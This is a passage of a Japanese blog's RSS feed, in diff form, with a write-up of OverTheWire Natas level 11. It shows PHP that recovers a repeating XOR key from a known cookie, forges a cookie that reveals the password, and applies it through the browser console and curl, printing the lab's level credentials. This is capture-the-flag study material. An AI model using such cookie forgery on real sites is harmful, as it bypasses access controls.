+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+    &lt;span class=&#34;c1&#34;&gt;// Iterate through each character
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)];&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;// Get the encrypted default, make sure to peel of the base64 encrypted layer
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$enc_defaults&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;// The defaults as found in the script
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$defaults&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;showpassword&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;no&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bgcolor&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#ffffff&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;// Obtain the key by abusing the properties of the XOR encryption
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$enc_defaults&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$defaults&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;// Display the result
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;そうすると&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;qw8J&lt;/code&gt;の繰り返しの文が出てきました。&lt;/p&gt;
+&lt;p&gt;この意味としては&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The key equals qw8J. One property of the XOR encryption is that the key often is repeated&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;XOR暗号化ではキーが繰り返されるみたいです。それは&lt;code&gt;$outText .= $text[$i] ^ $key[$i % strlen($key)];&lt;/code&gt;ここでもわかります。&lt;/p&gt;
+&lt;p&gt;キーがわかったので&lt;code&gt;$data[&#39;showpassword&#39;]&lt;/code&gt;が&lt;code&gt;yes&lt;/code&gt;になっている連想配列をXORしてCookieの値を更新してみましょう。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Now by using the key we just found we can create a modified version of the defaults
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+    &lt;span class=&#34;c1&#34;&gt;// Iterate through each character
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)];&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;qw8J&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;showpassword&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bgcolor&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#ffffff&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;実行するとCookieの値がわかりました。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;showpassword&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bgcolor&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#ffffff&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;あとはCookieの値を書き換えてあげましょう。
+やり方は以下の2つがあります&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Chromeの開発者ツール&lt;/li&gt;
+&lt;li&gt;curl&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;chromeの開発者ツール&#34;&gt;Chromeの開発者ツール&lt;/h4&gt;
+&lt;p&gt;デベロッパーツールのコンソールで以下を入力します&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;document.cookie=&amp;quot;data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure style=&#34;flex-grow: 210; flex-basis: 504px&#34;&gt;
+		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/a2.png&#34; data-size=&#34;2560x1218&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/a2.png&#34;
+				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/a2_hude26a41a55b6a82c1e132de10aca507c_421389_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/a2_hude26a41a55b6a82c1e132de10aca507c_421389_1024x0_resize_box_2.png 1024w&#34;
+				width=&#34;2560&#34;
+				height=&#34;1218&#34;
+				loading=&#34;lazy&#34;
+				alt=&#34;入力&#34;&gt;
+		&lt;/a&gt;
+		
+		&lt;figcaption&gt;入力&lt;/figcaption&gt;
+		
+	&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;そしてF5で更新するとパスワードが表示されます&lt;/p&gt;
+&lt;p&gt;&lt;figure style=&#34;flex-grow: 194; flex-basis: 466px&#34;&gt;
+		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/a1.png&#34; data-size=&#34;2560x1318&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/a1.png&#34;
+				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/a1_hu99ec95ebe0c30832bf95d59bc787d12e_880273_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/a1_hu99ec95ebe0c30832bf95d59bc787d12e_880273_1024x0_resize_box_2.png 1024w&#34;
+				width=&#34;2560&#34;
+				height=&#34;1318&#34;
+				loading=&#34;lazy&#34;
+				alt=&#34;デベロッパーツールでの表示&#34;&gt;
+		&lt;/a&gt;
+		
+		&lt;figcaption&gt;デベロッパーツールでの表示&lt;/figcaption&gt;
+		
+	&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;curl&#34;&gt;curl&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;-b&lt;/code&gt;でCookie情報のファイルを指定できます。上述で作成した&lt;code&gt;Cookie.txt&lt;/code&gt;のデータ部分を&lt;code&gt;ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&lt;/code&gt;に変えてcurlしてみるとパスワードが取得できます。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ curl -b cookie.txt -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK  http://natas11.natas.labs.overthewire.org
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;!-- This stuff in the header has nothing to do with the level --&amp;gt;
+&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/level.css&amp;quot;&amp;gt;
+&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/jquery-ui.css&amp;quot; /&amp;gt;
+&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/wechall.css&amp;quot; /&amp;gt;
+&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/jquery-ui.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/wechall.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;script&amp;gt;var wechallinfo = { &amp;quot;level&amp;quot;: &amp;quot;natas11&amp;quot;, &amp;quot;pass&amp;quot;: &amp;quot;U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK&amp;quot; };&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;
+
+&amp;lt;h1&amp;gt;natas11&amp;lt;/h1&amp;gt;
+&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;
+&amp;lt;body style=&amp;quot;background: #ffffff;&amp;quot;&amp;gt;
+Cookies are protected with XOR encryption&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3&amp;lt;br&amp;gt;
+&amp;lt;form&amp;gt;
+Background color: &amp;lt;input name=bgcolor value=&amp;quot;#ffffff&amp;quot;&amp;gt;
+&amp;lt;input type=submit value=&amp;quot;Set color&amp;quot;&amp;gt;
+&amp;lt;/form&amp;gt;
+
+&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;
+&lt;p&gt;今回は色々収穫ありでした。PHPを読んで問題に答える形式が多くなっているので、どんどんPHPに慣れることができます。インタラクティブシェル(&lt;code&gt;php -a&lt;/code&gt;)に触れました。次は気軽にPHPのスクリプトが書けそうです。ローカルでPHPファイルを実行する方法も機会があったら学びたいです。&lt;/p&gt;
+&lt;p&gt;また、XOR暗号とても勉強になりました。自分でもこのアルゴリズムをかければよかったのですが、今回は回答を見て勉強します。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>【OverTheWire奮闘記】Natas: Level7〜9</title>
         <link>https://tadakun8.github.io/post/over-the-wire/natas/level7-9/</link>
         <pubDate>Mon, 05 Jul 2021 21:06:51 +0900</pubDate>
